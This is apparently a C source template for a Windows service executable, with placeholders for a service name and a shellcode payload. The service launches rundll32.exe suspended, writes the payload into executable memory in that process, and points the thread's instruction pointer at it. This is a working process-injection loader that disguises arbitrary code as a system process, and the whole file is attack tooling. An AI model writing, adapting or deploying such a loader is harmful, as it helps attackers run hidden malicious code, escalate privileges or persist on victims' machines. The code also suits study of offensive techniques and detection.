#define WIN32_LEAN_AND_MEAN
#include <windows.h>

#define SCSIZE 8192
#define MAX_SECTION_NAME_SIZE 9

char cServiceName[32] = "SERVICENAME";
char bPayload[SCSIZE] = "PAYLOAD:";
char bSectionName[MAX_SECTION_NAME_SIZE] = "SECTION:";

typedef struct {
	// short is 2 bytes, long is 4 bytes
	WORD  signature;
	WORD  lastsize;
	WORD  nblocks;
	WORD  nreloc;
	WORD  hdrsize;
	WORD  minalloc;
	WORD  maxalloc;
	WORD  ss;
	WORD  sp;
	WORD  checksum;
	WORD  ip;
	WORD  cs;
	WORD  relocpos;
	WORD  noverlay;
	WORD  reserved1[4];
	WORD  oem_id;
	WORD  oem_info;
	WORD  reserved2[10];
	DWORD e_lfanew;
} DOS_HEADER, *PDOS_HEADER;

SERVICE_STATUS ss;

SERVICE_STATUS_HANDLE hStatus = NULL;

PIMAGE_SECTION_HEADER SectionHeaderFromName(PDOS_HEADER pDosHeader, PVOID pName) {
	// Retrieve the section header for the specified name.
	//
	// PDOS_HEADER pDosHeader: A pointer to the associated DOS header.
	// PVOID pName:            A pointer to the section header name to retrieve.
	// Returns: A pointer to the section header or NULL if it could not be
	// found.
	PIMAGE_NT_HEADERS pImgNtHeaders = NULL;
	PIMAGE_SECTION_HEADER pImgSecHeader = NULL;
	PIMAGE_SECTION_HEADER pImgSecHeaderCursor = NULL;
	DWORD dwCursor = 0;

	pImgNtHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)pDosHeader + pDosHeader->e_lfanew);
	pImgSecHeader = (PIMAGE_SECTION_HEADER)((ULONG_PTR)pImgNtHeaders + sizeof(IMAGE_NT_HEADERS));
	for (dwCursor = 0; dwCursor < pImgNtHeaders->FileHeader.NumberOfSections; dwCursor++) {
		pImgSecHeaderCursor = &pImgSecHeader[dwCursor];
		if (memcmp(pImgSecHeaderCursor->Name, pName, 8)) {
			continue;
		}
		return pImgSecHeaderCursor;
	}
	return NULL;
}

#if BUILDMODE == 2
/* hand-rolled bzero allows us to avoid including ms vc runtime */
void inline_bzero(void *p, size_t l)
{
	BYTE *q = (BYTE *)p;
	size_t x = 0;
	for (x = 0; x < l; x++)
		*(q++) = 0x00;
}

#endif

/*
 *
 */
BOOL ServiceHandler( DWORD dwControl )
{
	if( dwControl == SERVICE_CONTROL_STOP || dwControl == SERVICE_CONTROL_SHUTDOWN )
	{
		ss.dwWin32ExitCode = 0;
		ss.dwCurrentState  = SERVICE_STOPPED;
	}
	return SetServiceStatus( hStatus, &ss );
}

/*
 *
 */
VOID ServiceMain( DWORD dwNumServicesArgs, LPSTR * lpServiceArgVectors )
{
	CONTEXT Context;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	void *lpPayload = bPayload;
	unsigned int dwPayloadSize = SCSIZE;

	#if BUILDMODE == 2
	inline_bzero( &ss, sizeof(SERVICE_STATUS) );
	inline_bzero( &si, sizeof(STARTUPINFO) );
	inline_bzero( &pi, sizeof(PROCESS_INFORMATION) );
	#endif
	si.cb = sizeof(STARTUPINFO);

	ss.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;

	ss.dwCurrentState = SERVICE_START_PENDING;

	ss.dwControlsAccepted = SERVICE_ACCEPT_STOP|SERVICE_ACCEPT_SHUTDOWN;

	hStatus = RegisterServiceCtrlHandler( (LPCSTR)&cServiceName, (LPHANDLER_FUNCTION)ServiceHandler );

	if ( hStatus )
	{
		ss.dwCurrentState = SERVICE_RUNNING;

		PDOS_HEADER lpBaseAddress = (PDOS_HEADER) GetModuleHandleA(NULL);
		SetServiceStatus( hStatus, &ss );

		PIMAGE_SECTION_HEADER section;
		section = SectionHeaderFromName((PDOS_HEADER) GetModuleHandleA(NULL), bSectionName);
		if(section) {
			lpPayload = lpBaseAddress + section->VirtualAddress;
			dwPayloadSize = section->SizeOfRawData;
		}
		if( CreateProcess( NULL, "rundll32.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi ) )
		{
			Context.ContextFlags = CONTEXT_FULL;

			GetThreadContext( pi.hThread, &Context );

			lpPayload = VirtualAllocEx( pi.hProcess, NULL, dwPayloadSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE );
			if( lpPayload )
			{
				WriteProcessMemory( pi.hProcess, lpPayload, &bPayload, dwPayloadSize, NULL );
	#ifdef _WIN64
				Context.Rip = (ULONG_PTR)lpPayload;
	#else
				Context.Eip = (ULONG_PTR)lpPayload;
	#endif
				SetThreadContext( pi.hThread, &Context );
			}

			ResumeThread( pi.hThread );

			CloseHandle( pi.hThread );

			CloseHandle( pi.hProcess );
		}

		ServiceHandler( SERVICE_CONTROL_STOP );

		ExitProcess( 0 );
	}
}

/*
 *
 */
void main()
{
	SERVICE_TABLE_ENTRY st[] =
		{
			{ (LPSTR)&cServiceName, (LPSERVICE_MAIN_FUNCTIONA)&ServiceMain },
			{ NULL, NULL }
		};
	StartServiceCtrlDispatcher( (SERVICE_TABLE_ENTRY *)&st );
	return;
}
